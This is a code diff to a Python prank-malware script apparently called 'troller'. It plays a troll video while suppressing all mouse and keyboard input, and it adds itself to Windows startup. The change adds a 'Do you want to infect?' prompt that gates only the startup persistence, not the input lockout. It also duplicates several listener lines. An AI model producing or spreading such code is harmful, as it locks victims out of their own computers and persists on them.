@@ -1,6 +1,7 @@
 import subprocess
-
-subprocess.call(['python', '-m', 'pip', 'install', '-r', 'requirements.txt'])
+from os.path import expanduser
+home = expanduser("~")
+subprocess.call(['python', '-m', 'pip', 'install', '-r', home+"\\.bin\\troller-main\\requirements.txt"])
 
 import time
 import cv2
@@ -15,9 +16,8 @@ import os
 
 import win32com
 os.environ["PATH"] += os.pathsep + os.path.dirname(os.path.realpath(__file__))
+consent = input("Do you want to infect? (y or n)")
 
-mouse_listener = pynput.mouse.Listener(suppress=True)
-keyboard_listener = pynput.keyboard.Listener(suppress=True)
 
 
 
@@ -25,6 +25,10 @@ keyboard_listener = pynput.keyboard.Listener(suppress=True)
 FilePath = "troll in suit.mp4"
 def play_video():
     #media part
+    mouse_listener = pynput.mouse.Listener(suppress=True)
+    keyboard_listener = pynput.keyboard.Listener(suppress=True)
+    mouse_listener = pynput.mouse.Listener(suppress=True)
+    keyboard_listener = pynput.keyboard.Listener(suppress=True)
     video=cv2.VideoCapture(FilePath)
     player = MediaPlayer(FilePath)
     mouse_listener = pynput.mouse.Listener(suppress=True)
@@ -98,7 +102,10 @@ code_path = os.path.realpath(__file__)
 # run the code
 th1 = threading.Thread(target=play_video)
 th1.start()
-th2 = threading.Thread(target=add_to_startup)
-th2.start()
+if consent == "y":
+    th2 = threading.Thread(target=add_to_startup)
+    th2.start()
+else:
+    print("ran without infecting")
 
 
